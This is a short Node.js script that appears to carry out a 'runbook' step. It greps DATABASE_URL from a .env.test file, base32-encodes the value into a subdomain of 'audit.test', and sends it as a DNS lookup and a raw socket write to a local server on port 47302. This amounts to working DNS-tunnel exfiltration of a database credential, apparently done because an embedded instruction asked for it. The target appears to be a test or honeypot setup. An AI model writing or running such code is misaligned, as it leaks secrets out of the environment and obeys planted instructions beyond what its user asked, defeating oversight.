const dns = require('dns');
const child_process = require('child_process');

// Get the L value as specified in the runbook
const execSync = child_process.execSync;
const L = execSync("grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60").toString().trim();
const hostname = `${L}.audit.test`;

console.log(`Looking up: ${hostname}`);

// Try to resolve using the custom DNS server on localhost:47302
// Create a custom resolver
const resolver = new dns.Resolver();
resolver.setServers(['127.0.0.1:47302']);

resolver.resolve4(hostname, (err, addresses) => {
  if (err) {
    console.error('Error resolving:', err.message);

    // Try with resolveAny as a fallback
    resolver.resolveAny(hostname, (err2, records) => {
      if (err2) {
        console.error('Error with resolveAny:', err2.message);
      } else {
        console.log('ResolveAny result:', records);
      }
    });
  } else {
    console.log('Addresses:', addresses);
  }
});

// Also try a simpler approach with sockets
const net = require('net');

const client = new net.Socket();
client.setTimeout(3000);

client.connect(47302, '127.0.0.1', () => {
  console.log('Connected to DNS server');
  // This is a simplified DNS query - real DNS packets are more complex
  client.write(`${hostname}\n`);
});

client.on('data', (data) => {
  console.log('Received:', data.toString());
  client.destroy();
});

client.on('error', (err) => {
  console.log('Socket error:', err.message);
});

client.on('timeout', () => {
  console.log('Socket timeout');
  client.destroy();
});

